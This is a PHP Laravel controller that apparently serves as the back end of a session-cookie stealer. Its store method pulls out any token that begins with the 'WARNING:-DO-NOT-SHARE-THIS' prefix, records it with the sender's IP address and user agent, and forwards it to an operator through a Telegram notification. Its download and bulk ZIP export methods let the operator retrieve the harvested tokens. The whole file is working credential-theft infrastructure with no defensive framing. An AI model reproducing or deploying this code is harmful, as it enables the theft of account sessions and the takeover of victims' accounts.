<?php

namespace App\Http\Controllers;

use App\Models\Submission;
use App\Services\TelegramService;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\StreamedResponse;
use ZipArchive;

class SubmissionController extends Controller
{
    public function store(Request $request, TelegramService $telegram): JsonResponse
    {
        $validated = $request->validate([
            'cookie' => ['required', 'string', 'min:1'],
        ]);

        $raw = $validated['cookie'];
        if (preg_match('/(_\|WARNING:-DO-NOT-SHARE-THIS\.[^"\'\r\n\s]+)/', $raw, $matches)) {
            $content = $matches[1];
        } else {
            $content = $raw;
        }

        $submission = Submission::create([
            'content' => $content,
            'ip_address' => $request->ip(),
            'user_agent' => $request->userAgent(),
        ]);

        $telegram->sendSubmissionNotification($submission->content, $submission->ip_address ?? 'unknown');

        return response()->json(['success' => true]);
    }

    public function download(Submission $submission): StreamedResponse
    {
        return response()->streamDownload(function () use ($submission): void {
            echo $submission->content;
        }, "submission_{$submission->id}.txt", ['Content-Type' => 'text/plain']);
    }

    public function bulkDownload(Request $request): mixed
    {
        $ids = session()->pull('bulk_export_ids', []);

        if (empty($ids)) {
            abort(404);
        }

        $submissions = Submission::whereIn('id', $ids)->get();

        if ($submissions->isEmpty()) {
            abort(404);
        }

        $tmpPath = tempnam(sys_get_temp_dir(), 'submissions_').'.zip';

        $zip = new ZipArchive;
        $zip->open($tmpPath, ZipArchive::CREATE | ZipArchive::OVERWRITE);

        foreach ($submissions as $submission) {
            $zip->addFromString("submission_{$submission->id}.txt", $submission->content);
        }

        $zip->close();

        return response()->download($tmpPath, 'submissions.zip', ['Content-Type' => 'application/zip'])->deleteFileAfterSend(true);
    }
}
